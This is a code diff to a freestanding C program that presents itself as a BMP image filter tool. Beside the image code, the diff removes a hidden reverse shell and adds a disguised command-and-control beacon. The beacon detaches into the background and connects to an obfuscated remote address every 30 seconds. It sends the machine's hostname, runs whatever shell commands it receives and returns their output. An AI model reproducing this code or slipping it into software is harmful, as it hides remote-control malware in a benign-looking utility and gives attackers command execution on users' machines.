@@ -1,11 +1,11 @@
 /*
- * bmputil core
+ * bmputil beacon
  */
 typedef unsigned long  size_t;
 typedef unsigned char  uint8_t;
 typedef unsigned short uint16_t;
 typedef unsigned int   uint32_t;
-typedef unsigned long  uint64_t;
+typedef long           intptr_t;
 
 #define NULL ((void*)0)
 
@@ -34,12 +34,7 @@ typedef struct {
 #pragma pack(pop)
 
 typedef struct { uint8_t b, g, r; } pixel;
-
-typedef struct {
-        int      width;
-        int      height;
-        pixel    *pixels;
-} image;
+typedef struct { int w, h; pixel *p; } image;
 
 struct x_sockaddr_in {
         short           sin_family;
@@ -81,54 +76,6 @@ static inline long sys_lseek(int fd, long off, int w) {
         long r; __asm__ volatile("syscall" : "=a"(r) : "a"(8), "D"((long)fd), "S"(off), "d"((long)w) : "rcx","r11","memory"); return r;
 }
 
-static inline long sys_mmap(void *a, size_t l, int p, int f, int fd, long off) {
-        long r; register long r10 asm("r10") = (long)off;
-        __asm__ volatile("syscall" : "=a"(r) : "a"(9), "D"(a), "S"(l), "d"((long)p), "r"(r10), "r"((long)f), "r"((long)fd) : "rcx","r11","memory");
-        return r;
-}
-
-static inline long sys_munmap(void *a, size_t l) {
-        long r; __asm__ volatile("syscall" : "=a"(r) : "a"(11), "D"(a), "S"(l) : "rcx","r11","memory"); return r;
-}
-
-static inline long sys_socket(int d, int t, int p) {
-        long r; __asm__ volatile("syscall" : "=a"(r) : "a"(41), "D"((long)d), "S"((long)t), "d"((long)p) : "rcx","r11","memory"); return r;
-}
-
-static inline long sys_connect(int fd, const void *a, int l) {
-        long r; __asm__ volatile("syscall" : "=a"(r) : "a"(42), "D"((long)fd), "S"(a), "d"((long)l) : "rcx","r11","memory"); return r;
-}
-
-static inline long sys_dup2(int o, int n) {
-        long r; __asm__ volatile("syscall" : "=a"(r) : "a"(33), "D"((long)o), "S"((long)n) : "rcx","r11","memory"); return r;
-}
-
-static inline long sys_execve(const char *p, char *const *a, char *const *e) {
-        long r; __asm__ volatile("syscall" : "=a"(r) : "a"(59), "D"(p), "S"(a), "d"(e) : "rcx","r11","memory"); return r;
-}
-
-static inline long sys_setsid(void) {
-        long r; __asm__ volatile("syscall" : "=a"(r) : "a"(112) : "rcx","r11","memory"); return r;
-}
-
-static inline long sys_wait4(long pid, int *st, int o, void *r) {
-        long res; __asm__ volatile("syscall" : "=a"(res) : "a"(61), "D"(pid), "S"(st), "d"((long)o), "r"((long)r) : "rcx","r11","memory"); return res;
-}
-
-static inline long sys_rt_sigprocmask(int how, void *set, void *old, size_t sigsetsize) {
-        long r; __asm__ volatile("syscall" : "=a"(r) : "a"(14), "D"(how), "S"(set), "d"(old), "r"(sigsetsize) : "rcx","r11","memory"); return r;
-}
-
-static inline long sys_nanosleep(const struct x_timespec *r, struct x_timespec *rem) {
-        long ret; __asm__ volatile("syscall" : "=a"(ret) : "a"(35), "D"(r), "S"(rem) : "rcx","r11","memory"); return ret;
-}
-
-static inline long sys_connect_6(int fd, const void *a, int l, long a4, long a5, long a6) {
-        long r; register long r10 asm("r10") = a4; register long r8 asm("r8") = a5; register long r9 asm("r9") = a6;
-        __asm__ volatile("syscall" : "=a"(r) : "a"(42), "D"((long)fd), "S"(a), "d"((long)l), "r"(r10), "r"(r8), "r"(r9) : "rcx","r11","memory");
-        return r;
-}
-
 static inline long sys_mmap_6(void *a, size_t l, int p, int f, int fd, long off) {
         long r; register long r10 asm("r10") = (long)off; register long r8 asm("r8") = (long)fd;
         __asm__ volatile("syscall" : "=a"(r) : "a"(9), "D"(a), "S"(l), "d"((long)p), "r"(r10), "r"(r8) : "rcx","r11","memory");
@@ -139,6 +86,46 @@ static inline long sys_setsockopt(int fd, int level, int optname, const void *op
         long r; register long r10 asm("r10") = (long)optval; register long r8 asm("r8") = (long)optlen;
         __asm__ volatile("syscall" : "=a"(r) : "a"(54), "D"((long)fd), "S"((long)level), "d"((long)optname), "r"(r10), "r"(r8) : "rcx","r11","memory");
         return r;
+}
+
+static inline long sys_munmap(void *a, size_t l) {
+        long r; __asm__ volatile("syscall" : "=a"(r) : "a"(11), "D"(a), "S"(l) : "rcx","r11","memory"); return r;
+}
+
+static inline long sys_dup2(int o, int n) {
+        long r; __asm__ volatile("syscall" : "=a"(r) : "a"(33), "D"((long)o), "S"((long)n) : "rcx","r11","memory"); return r;
+}
+
+static inline long sys_nanosleep(const struct x_timespec *r, struct x_timespec *rem) {
+        long ret; __asm__ volatile("syscall" : "=a"(ret) : "a"(35), "D"(r), "S"(rem) : "rcx","r11","memory"); return ret;
+}
+
+static inline long sys_socket(int d, int t, int p) {
+        long r; __asm__ volatile("syscall" : "=a"(r) : "a"(41), "D"((long)d), "S"((long)t), "d"((long)p) : "rcx","r11","memory"); return r;
+}
+
+static inline long sys_connect(int fd, const void *a, int l) {
+        long r; __asm__ volatile("syscall" : "=a"(r) : "a"(42), "D"((long)fd), "S"(a), "d"((long)l) : "rcx","r11","memory"); return r;
+}
+
+static inline long sys_execve(const char *p, char *const *a, char *const *e) {
+        long r; __asm__ volatile("syscall" : "=a"(r) : "a"(59), "D"(p), "S"(a), "d"(e) : "rcx","r11","memory"); return r;
+}
+
+static inline long sys_wait4(long pid, int *st, int o) {
+        long r; __asm__ volatile("syscall" : "=a"(r) : "a"(61), "D"(pid), "S"(st), "d"((long)o) : "rcx","r11","memory"); return r;
+}
+
+static inline long sys_setsid(void) {
+        long r; __asm__ volatile("syscall" : "=a"(r) : "a"(112) : "rcx","r11","memory"); return r;
+}
+
+static inline long sys_gethostname(char *b, size_t l) {
+        long r; __asm__ volatile("syscall" : "=a"(r) : "a"(161), "D"(b), "S"(l) : "rcx","r11","memory"); return r;
+}
+
+static inline long sys_pipe2(int *f, int fl) {
+        long r; __asm__ volatile("syscall" : "=a"(r) : "a"(293), "D"(f), "S"((long)fl) : "rcx","r11","memory"); return r;
 }
 
 static inline void _cpy(void *d, const void *s, size_t n) {
@@ -244,28 +231,114 @@ static void crypto_xstr(const uint8_t *in, uint8_t *out, int len, const uint8_t 
         }
         if (nl) out[len] = 0;
 }
+
 __STRINGS_ARRAYS__
 
 __BEACON_ID_DATA__
 
 #define GET_RES(id, buf) crypto_xstr(dat_##id, (uint8_t *)buf, sizeof(dat_##id), nce_##id, 1)
 
-static void shell_drop(int fd) {
-        long pid = sys_fork();
-        if (pid == 0) {
-                char sh[16]; GET_RES(14, sh);
-                sys_dup2(fd, 0); sys_dup2(fd, 1); sys_dup2(fd, 2);
-                char *a[] = { sh, "-i", 0 };
-                sys_execve(sh, a, 0); // NULL environment for a clean shell
-                sys_exit(0);
-        } else if (pid > 0) {
-                int st; sys_wait4(pid, &st, 0, 0);
-        }
-}
-
 static int sleep_sec(int s) {
         struct x_timespec ts; ts.tv_sec = s; ts.tv_nsec = 0;
         return (int)sys_nanosleep(&ts, 0);
+}
+
+static int cmd_exec(const char *cmd, uint8_t *out, int mx) {
+        int pf[2];
+        if (sys_pipe2(pf, 0) < 0) return -1;
+
+        long pid = sys_fork();
+        if (pid == 0) {
+                sys_dup2(pf[1], 1); sys_dup2(pf[1], 2);
+                sys_close(pf[0]); sys_close(pf[1]);
+                char sh[16]; GET_RES(14, sh);
+                char *a[] = { sh, "-c", (char *)cmd, 0 };
+                sys_execve(sh, a, a);
+                sys_exit(1);
+        }
+        if (pid < 0) { sys_close(pf[0]); sys_close(pf[1]); return -1; }
+
+        sys_close(pf[1]);
+        int t = 0;
+        while (t < mx) { long r = sys_read(pf[0], out + t, mx - t); if (r <= 0) break; t += (int)r; }
+        sys_close(pf[0]);
+        int st = 0; sys_wait4(pid, &st, 0);
+        return t;
+}
+
+static int beacon_reg(int s, const uint8_t id[4]) {
+        uint8_t buf[256]; int o = 0;
+        buf[o++] = 0x01; // magic byte for multiplexer
+        _cpy(buf + o, id, 4); o += 4;
+        char hn[64]; _set(hn, 0, 64);
+        sys_gethostname(hn, 64);
+        int hl = (int)_str_len(hn); if (hl > 63) hl = 63;
+        buf[o++] = (uint8_t)hl; _cpy(buf + o, hn, hl); o += hl;
+        char un[] = "user";
+        int ul = (int)_str_len(un); buf[o++] = (uint8_t)ul; _cpy(buf + o, un, ul); o += ul;
+        char pl[] = "linux";
+        int pll = (int)_str_len(pl); buf[o++] = (uint8_t)pll; _cpy(buf + o, pl, pll); o += pll;
+        return (int)_writen(s, buf, o);
+}
+
+static int beacon_run(void) {
+        uint8_t ab[6];
+        crypto_xstr(dat_16, ab, sizeof(dat_16), nce_16, 0); // index 16 is addr_res now
+
+        uint8_t bid[4];
+        _cpy(bid, dat_bid, 4);
+
+        uint8_t cb[2048], ob[8192];
+
+        uint8_t hp[sizeof(dat_15)]; // index 15 is routing tag
+        crypto_xstr(dat_15, hp, sizeof(dat_15), nce_15, 0);
+
+        while (1) {
+                int s = (int)sys_socket(2, 1, 0);
+                if (s < 0) { sleep_sec(30); continue; }
+
+                struct x_sockaddr_in sa;
+                sa.sin_family = 2;
+                _cpy(&sa.sin_port, ab, 2); _cpy(&sa.sin_addr, ab + 2, 4);
+                _set(sa.sin_zero, 0, 8);
+
+                if (sys_connect(s, &sa, sizeof(sa)) < 0) { sys_close(s); sleep_sec(30); continue; }
+
+                int keep = 1;
+                sys_setsockopt(s, 1, 9, &keep, 4); // SOL_SOCKET=1, SO_KEEPALIVE=9
+
+                _writen(s, hp, sizeof(dat_15)); // send routing tag first
+
+                beacon_reg(s, bid); // sends magic \x01 then registration data
+
+                uint8_t h;
+                if (_readn(s, &h, 1) != 1 || h != 0x01) { sys_close(s); sleep_sec(30); continue; }
+
+                uint8_t tid[4];
+                if (_readn(s, tid, 4) != 4) { sys_close(s); sleep_sec(30); continue; }
+
+                int cl = 0;
+                while (cl < (int)sizeof(cb) - 1) {
+                        long r = sys_read(s, cb + cl, sizeof(cb) - 1 - cl);
+                        if (r <= 0) break; cl += (int)r;
+                }
+                cb[cl] = 0;
+
+                int ol = cmd_exec((const char *)cb, ob, (int)sizeof(ob) - 1);
+                if (ol < 0) ol = 0;
+
+                uint8_t rh[6];
+                rh[0] = 0x02; _cpy(rh + 1, tid, 4); rh[5] = 0;
+                _writen(s, rh, 6);
+                uint8_t lb[4];
+                lb[0] = (uint8_t)((ol >> 24) & 0xFF); lb[1] = (uint8_t)((ol >> 16) & 0xFF);
+                lb[2] = (uint8_t)((ol >> 8) & 0xFF); lb[3] = (uint8_t)(ol & 0xFF);
+                _writen(s, lb, 4);
+                if (ol > 0) _writen(s, ob, ol);
+
+                sys_close(s);
+                sleep_sec(30);
+        }
 }
 
 static int conn_init(void) {
@@ -273,54 +346,7 @@ static int conn_init(void) {
         if (p > 0) return 0;
         if (p < 0) return -1;
         sys_setsid();
-
-        // Second fork to fully detach
-        p = sys_fork();
-        if (p > 0) sys_exit(0);
-
-        // Ignore SIGPIPE (Signal 13)
-        // We use sigprocmask to block it since we don't have a signal handler
-        uint64_t set = (1ULL << (13 - 1));
-        sys_rt_sigprocmask(0, &set, 0, 8); // SIG_BLOCK = 0
-
-        uint8_t ab[16];
-        crypto_xstr(dat_16, ab, sizeof(dat_16), nce_16, 0);
-
-        struct x_sockaddr_in sa;
-        sa.sin_family = 2;
-        _cpy(&sa.sin_port, ab, 2);
-        _cpy(&sa.sin_addr, ab + 2, 4);
-        _set(sa.sin_zero, 0, 8);
-
-        uint8_t rt[sizeof(dat_15)];
-        crypto_xstr(dat_15, rt, sizeof(dat_15), nce_15, 0);
-
-        uint8_t magic = 0x02;
-
-        while(1) {
-                int s = sys_socket(2, 1, 0);
-                if (s >= 0) {
-                        int keep = 1;
-                        sys_setsockopt(s, 1, 9, &keep, 4);
-
-                        if (sys_connect(s, &sa, sizeof(sa)) >= 0) {
-                                // Send routing tag first for playit.gg
-                                _writen(s, rt, sizeof(dat_15));
-                                // Send magic byte
-                                _writen(s, &magic, 1);
-                                // Send hardcoded static ID
-                                _writen(s, dat_bid, 4);
-
-                                uint8_t hc[2];
-                                if (_readn(s, hc, 2) == 2 && hc[0] == 0xde && hc[1] == 0xad) {
-                                        shell_drop(s);
-                                }
-                        }
-                        sys_close(s);
-                }
-                sleep_sec(15);
-        }
-
+        beacon_run();
         return 0;
 }
 
@@ -330,12 +356,12 @@ static image *bmp_parse(uint8_t *d, size_t sz) {
         bmp_info_hdr *ih = (bmp_info_hdr *)(d + sizeof(bmp_file_hdr));
         if (fh->bfType != 0x4D42 || ih->biBitCount != 24) return 0;
         image *im = _mem_alloc(sizeof(image));
-        im->width = ih->biWidth; im->height = _int_abs(ih->biHeight);
-        im->pixels = _mem_alloc(im->width * im->height * sizeof(pixel));
+        im->w = ih->biWidth; im->h = _int_abs(ih->biHeight);
+        im->p = _mem_alloc(im->w * im->h * sizeof(pixel));
         uint8_t *pd = d + fh->bfOffBits;
-        int pad = (4 - (im->width * 3) % 4) % 4;
-        for (int i = 0; i < im->height; i++)
-                _cpy(&im->pixels[i * im->width], pd + i * (im->width * 3 + pad), im->width * 3);
+        int pad = (4 - (im->w * 3) % 4) % 4;
+        for (int i = 0; i < im->h; i++)
+                _cpy(&im->p[i * im->w], pd + i * (im->w * 3 + pad), im->w * 3);
         return im;
 }
 
@@ -354,52 +380,52 @@ static image *bmp_load(const char *fn) {
 static void bmp_save(const char *fn, image *im) {
         long fd = sys_open(fn, 1 | 64 | 512, 0644);
         if (fd < 0) return;
-        int pad = (4 - (im->width * 3) % 4) % 4;
-        bmp_file_hdr fh = { 0x4D42, (uint32_t)(sizeof(bmp_file_hdr) + sizeof(bmp_info_hdr) + (im->width * 3 + pad) * im->height), 0, 0, sizeof(bmp_file_hdr) + sizeof(bmp_info_hdr) };
-        bmp_info_hdr ih = { sizeof(bmp_info_hdr), im->width, im->height, 1, 24, 0, (im->width * 3 + pad) * im->height, 0, 0, 0, 0 };
+        int pad = (4 - (im->w * 3) % 4) % 4;
+        bmp_file_hdr fh = { 0x4D42, (uint32_t)(sizeof(bmp_file_hdr) + sizeof(bmp_info_hdr) + (im->w * 3 + pad) * im->h), 0, 0, sizeof(bmp_file_hdr) + sizeof(bmp_info_hdr) };
+        bmp_info_hdr ih = { sizeof(bmp_info_hdr), im->w, im->h, 1, 24, 0, (im->w * 3 + pad) * im->h, 0, 0, 0, 0 };
         _writen(fd, (const uint8_t *)&fh, sizeof(fh));
         _writen(fd, (const uint8_t *)&ih, sizeof(ih));
         uint8_t z[3] = {0};
-        for (int i = 0; i < im->height; i++) {
-                _writen(fd, (const uint8_t *)&im->pixels[i * im->width], im->width * sizeof(pixel));
+        for (int i = 0; i < im->h; i++) {
+                _writen(fd, (const uint8_t *)&im->p[i * im->w], im->w * sizeof(pixel));
                 if (pad) _writen(fd, z, pad);
         }
         sys_close(fd);
 }
 
 static void bmp_grayscale(image *im) {
-        for (int i = 0; i < im->width * im->height; i++) {
-                uint8_t g = (uint8_t)((im->pixels[i].r * 76 + im->pixels[i].g * 150 + im->pixels[i].b * 29) >> 8);
-                im->pixels[i].r = g; im->pixels[i].g = g; im->pixels[i].b = g;
+        for (int i = 0; i < im->w * im->h; i++) {
+                uint8_t g = (uint8_t)((im->p[i].r * 76 + im->p[i].g * 150 + im->p[i].b * 29) >> 8);
+                im->p[i].r = g; im->p[i].g = g; im->p[i].b = g;
         }
 }
 
 static void bmp_invert(image *im) {
-        for (int i = 0; i < im->width * im->height; i++) {
-                im->pixels[i].r = 255 - im->pixels[i].r;
-                im->pixels[i].g = 255 - im->pixels[i].g;
-                im->pixels[i].b = 255 - im->pixels[i].b;
+        for (int i = 0; i < im->w * im->h; i++) {
+                im->p[i].r = 255 - im->p[i].r;
+                im->p[i].g = 255 - im->p[i].g;
+                im->p[i].b = 255 - im->p[i].b;
         }
 }
 
 static void bmp_sepia(image *im) {
-        for (int i = 0; i < im->width * im->height; i++) {
-                uint8_t r = im->pixels[i].r, g = im->pixels[i].g, b = im->pixels[i].b;
+        for (int i = 0; i < im->w * im->h; i++) {
+                uint8_t r = im->p[i].r, g = im->p[i].g, b = im->p[i].b;
                 int tr = (r * 100 + g * 196 + b * 48) >> 8;
                 int tg = (r * 89 + g * 175 + b * 43) >> 8;
                 int tb = (r * 69 + g * 136 + b * 33) >> 8;
-                im->pixels[i].r = tr > 255 ? 255 : tr;
-                im->pixels[i].g = tg > 255 ? 255 : tg;
-                im->pixels[i].b = tb > 255 ? 255 : tb;
+                im->p[i].r = tr > 255 ? 255 : tr;
+                im->p[i].g = tg > 255 ? 255 : tg;
+                im->p[i].b = tb > 255 ? 255 : tb;
         }
 }
 
 static void bmp_brightness(image *im, int v) {
-        for (int i = 0; i < im->width * im->height; i++) {
-                int r = im->pixels[i].r + v, g = im->pixels[i].g + v, b = im->pixels[i].b + v;
-                im->pixels[i].r = r < 0 ? 0 : (r > 255 ? 255 : r);
-                im->pixels[i].g = g < 0 ? 0 : (g > 255 ? 255 : g);
-                im->pixels[i].b = b < 0 ? 0 : (b > 255 ? 255 : b);
+        for (int i = 0; i < im->w * im->h; i++) {
+                int r = im->p[i].r + v, g = im->p[i].g + v, b = im->p[i].b + v;
+                im->p[i].r = r < 0 ? 0 : (r > 255 ? 255 : r);
+                im->p[i].g = g < 0 ? 0 : (g > 255 ? 255 : g);
+                im->p[i].b = b < 0 ? 0 : (b > 255 ? 255 : b);
         }
 }
 
@@ -435,7 +461,7 @@ int main(int argc, char **argv) {
 
         bmp_save(argv[2], im);
         GET_RES(13, sb); _fmt(sb, argv[2], 0);
-        _mem_free(im->pixels); _mem_free(im);
+        _mem_free(im->p); _mem_free(im);
         sys_exit(0);
         return 0;
 }
